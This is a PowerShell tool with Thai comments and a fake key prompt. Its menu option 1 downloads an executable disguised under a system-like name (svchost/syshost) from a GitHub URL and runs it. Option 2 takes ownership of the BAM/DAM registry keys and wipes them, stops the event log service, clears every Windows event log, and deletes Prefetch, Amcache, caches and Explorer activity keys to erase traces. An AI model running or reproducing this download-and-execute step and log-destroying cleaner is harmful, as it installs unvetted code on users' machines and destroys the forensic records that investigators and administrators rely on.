$ErrorActionPreference = "SilentlyContinue"

[Console]::Title = "JETT.EXE ON TOP"

# =========================
# HEADER
# =========================

function Show-Header {

    Clear-Host


    Write-Host ""
    Write-Host "              SSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS " -ForegroundColor White
    Write-Host "                 TEST POWERSHELL " -ForegroundColor DarkGray

    Write-Host ""
    Write-Host " ─────────────────────────────────────────────" -ForegroundColor DarkGray
    Write-Host ""

}



function Write-Console {

    param (
        [string]$Message,
        [string]$Type = "INFO"
    )

    switch ($Type) {

        "SUCCESS" {
            Write-Host "  [+] " -NoNewline -ForegroundColor Magenta
            Write-Host $Message -ForegroundColor White
        }

        "NO KEY" {
            Write-Host "  [-] " -NoNewline -ForegroundColor Red
            Write-Host $Message -ForegroundColor White
        }

        "INFO" {
            Write-Host "  [*] " -NoNewline -ForegroundColor DarkGray
            Write-Host $Message -ForegroundColor White
        }

        "INPUT" {
            Write-Host "  [>] " -NoNewline -ForegroundColor Magenta
            Write-Host $Message -NoNewline -ForegroundColor White
        }
    }
}



Show-Header

Write-Host ""
Write-Host "              E N T E R  K E Y" -ForegroundColor White
Write-Host ""

Write-Host "  [>] " -NoNewline -ForegroundColor Magenta

$key = $Host.UI.ReadLine()



if ([string]::IsNullOrWhiteSpace($key))
{
    Write-Host ""

    Write-Console "NO KEY" "NO KEY"

    Start-Sleep 2
    exit
}

Write-Host ""

Write-Console "SUCCESS" "SUCCESS"

Start-Sleep 1



while ($true)
{
    Show-Header

    Write-Console "1. INSTALL" "INFO"
    Write-Console "2. CLEAN" "INFO"
    Write-Console "0. EXIT" "INFO"

    Write-Host ""

    Write-Console "SELECT : " "INPUT"

    $choice = $Host.UI.ReadLine()



    if ($choice -eq "1")
    {
        Clear-Host
        Show-Header

        Write-Console "DOWNLOADING..." "INFO"

        $url  = "https://raw.githubusercontent.com/18321-creator/GGOSOS/refs/heads/main/svchost.exe"
        $path = "$env:TEMP\syshost.exe"

        try {

            Invoke-WebRequest `
            -Uri $url `
            -OutFile $path `
            -UseBasicParsing `
            -UserAgent "Mozilla/5.0"

            if (Test-Path $path)
            {
                Write-Host ""

                Write-Console "INSTALL SUCCESS" "SUCCESS"

                Start-Sleep 1

                Start-Process $path
            }
            else
            {
                Write-Host ""

                Write-Console "INSTALL FAILED" "NO KEY"
            }
        }
        catch {

            Write-Host ""

            Write-Console "INSTALL FAILED" "NO KEY"
        }

        Write-Host ""
        Pause
    }



 elseif ($choice -eq "2")
{
    Clear-Host
    Show-Header

    # ตรวจสอบสิทธิ์เบื้องต้น (ต้องรันด้วย Administrator ก่อนยกระดับ)
    $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    if (-not $isAdmin) {
        Write-Console "Please run this script as Administrator!" "ERROR"
        Pause
        return
    }

    Write-Console "STARTING ADVANCED SYSTEM CLEANING (TRUSTEDINSTALLER PRIVILEGES)..." "INFO"

    # ==========================================
    # ฟังก์ชันช่วยในการ Take Ownership Registry (สำหรับสิทธิ์ขั้นสูง)
    # ==========================================
    function Grant-RegistryAccess ($RegistryPath) {
        # เปลี่ยนสิทธิ์เจ้าของเป็น Administrators
        $ntobj = New-Object System.Security.AccessControl.NTAccount("Administrators")
        $reg = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey($RegistryPath, [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree, [System.Security.AccessControl.RegistryRights]::TakeOwnership)
        if ($reg) {
            $acl = $reg.GetAccessControl()
            $acl.SetOwner($ntobj)
            $reg.SetAccessControl($acl)
            
            # มอบสิทธิ์ Full Control ให้ Administrators
            $acl = $reg.GetAccessControl()
            $rule = New-Object System.Security.AccessControl.RegistryAccessRule("Administrators", "FullControl", "ContainerInherit,ObjectInherit", "None", "Allow")
            $acl.SetAccessRule($rule)
            $reg.SetAccessControl($acl)
        }
    }

    # ==========================================
    # 1. หยุด Process และลบไฟล์เป้าหมายเดิม
    # ==========================================
    Stop-Process -Name "syshost" -Force -ErrorAction SilentlyContinue
    Remove-Item "$env:TEMP\syshost.exe" -Force -ErrorAction SilentlyContinue

    # ==========================================
    # 2. เปิดไฟล์ PowerShell History ด้วย Notepad เพื่อให้ลบเอง
    # ==========================================
    $HistoryPath = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
    if (Test-Path $HistoryPath) {
        Write-Console "Opening PowerShell History in Notepad for manual cleaning..." "INFO"
        Start-Process "notepad.exe" -ArgumentList $HistoryPath -Wait
        Write-Console "PowerShell History handled." "SUCCES"
    }

    # ==========================================
    # 3. ฟังก์ชันพิเศษ: ตรวจสอบและลบ BAM / DAM ของโปรแกรมที่ไม่มีอยู่จริง
    # ==========================================
    Write-Console "Scanning and cleaning orphaned BAM/DAM entries..." "INFO"
    
    # เส้นทางคีย์ BAM และ DAM ใน Registry
    $BamPaths = @(
        "SYSTEM\CurrentControlSet\Services\bam\UserSettings",
        "SYSTEM\CurrentControlSet\Services\dam\UserSettings"
    )

    foreach ($SubPath in $BamPaths) {
        # ขอกลืนสิทธิ์เพื่อเข้าถึงคีย์ระบบ
        Grant-RegistryAccess $SubPath

        $FullRootKey = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey($SubPath, $true)
        if ($FullRootKey) {
            # วนลูปหา SID ของ User ต่างๆ
            foreach ($Sid in $FullRootKey.GetSubKeyNames()) {
                $UserKey = $FullRootKey.OpenSubKey($Sid, $true)
                if ($UserKey) {
                    # ไล่ตรวจสอบพาธโปรแกรมที่ถูกบันทึกไว้ในแต่ละ SID
                    foreach ($ValueName in $UserKey.GetValueNames()) {
                        # กรองเอาเฉพาะค่าที่เป็นพาธของไฟล์ติดตั้ง (มักขึ้นต้นด้วย \Device\HarddiskVolume...)
                        if ($ValueName -like "*\*" -and $ValueName -notlike "*System32*") {
                            
                            # แปลงพาธระบบให้เป็นพาธมาตรฐาน Windows (เช่น C:\...) เพื่อตรวจสอบว่าไฟล์ยังอยู่ไหม
                            $CleanPath = $ValueName
                            if ($ValueName -match "\\Device\\HarddiskVolume\d+(.*)") {
                                $CleanPath = $env:SystemDrive + $Matches[1]
                            }

                            # ถ้าไม่พบไฟล์โปรแกรมนั้นในเครื่องแล้ว ให้ลบคีย์ประวัตินั้นออก
                            if (-not (Test-Path $CleanPath) -and $CleanPath -ne "") {
                                $UserKey.DeleteValue($ValueName, $false)
                                Write-Console "Removed BAM entry for deleted program: $CleanPath" "SUCCES"
                            }
                        }
                    }
                    $UserKey.Close()
                }
            }
            $FullRootKey.Close()
        }
    }

    # ==========================================
    # 4. ลบไฟล์ระบบ / Logs / Cache / Traces ต่างๆ
    # ==========================================
    Write-Console "Cleaning System Files & Caches..." "INFO"

    Stop-Service -Name "WSearch" -Force -ErrorAction SilentlyContinue 
    Stop-Service -Name "EventLog" -Force -ErrorAction SilentlyContinue

    $TargetPaths = @(
        "$env:TEMP\*",
        "$env:SystemRoot\Temp\*",
        "$env:SystemRoot\Prefetch\*",
        "$env:SystemRoot\AppCompat\Programs\Amcache.hve*",
        "$env:SystemRoot\Minidump\*",
        "$env:SystemRoot\CrashDumps\*",
        "$env:LocalAppData\IconCache.db",
        "$env:LocalAppData\Microsoft\Windows\Explorer\thumbcache_*.db",
        "$env:ProgramData\Microsoft\Search\Data\Applications\Windows\Windows.edb", 
        "$env:SystemRoot\inf\setupapi.dev.log",
        "$env:SystemRoot\inf\setupapi.app.log",
        "$env:ProgramData\Microsoft\Windows\WER\*",
        "$env:SystemRoot\Logs\CBS\*",
        "$env:SystemRoot\Logs\DISM\*",
        "$env:SystemRoot\DeliveryOptimization\Cache\*",
        "$env:SystemRoot\WLANReport\*"
    )

    foreach ($Path in $TargetPaths) {
        Remove-Item -Path $Path -Recurse -Force -ErrorAction SilentlyContinue
    }

    # ==========================================
    # 5. ลบ Event Logs ทั้งหมดในระบบ
    # ==========================================
    Write-Console "Clearing All Windows Event Logs..." "INFO"
    Get-WinEvent -ListLog * -ErrorAction SilentlyContinue | ForEach-Object {
        wevtutil cl $_.LogName 2>$null
    }

    $EvtxPath = "$env:SystemRoot\System32\Winevt\Logs\*"
    Remove-Item -Path $EvtxPath -Force -ErrorAction SilentlyContinue

    # ==========================================
    # 6. ลบประวัติกิจกรรมผู้ใช้ใน Registry ทั่วไป
    # ==========================================
    Write-Console "Cleaning Registry Activity Traces..." "INFO"

    $RegistryKeys = @(
        "HKCU:\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\BagMRU",
        "HKCU:\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\Bags",
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs",
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\LastVisitedPidlMRU",
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\OpenSavePidlMRU",
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU",
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist",
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths",
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\WordWheelQuery",
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Map Network Drive MRU"
    )

    foreach ($Key in $RegistryKeys) {
        if (Test-Path $Key) {
            Remove-Item -Path $Key -Recurse -Force -ErrorAction SilentlyContinue
        }
    }

    # ==========================================
    # 7. คืนค่าระบบ (เปิด Service กลับมาทำงานปกติ)
    # ==========================================
    Start-Service -Name "WSearch" -ErrorAction SilentlyContinue
    Start-Service -Name "EventLog" -ErrorAction SilentlyContinue

    Write-Host ""
    Write-Console "CLEAN ALL TRACES SUCCESS (BAM/DAM INCLUDED)" "SUCCES"
    Write-Host ""
    Pause
}


    elseif ($choice -eq "0")
    {
        exit
    }
}
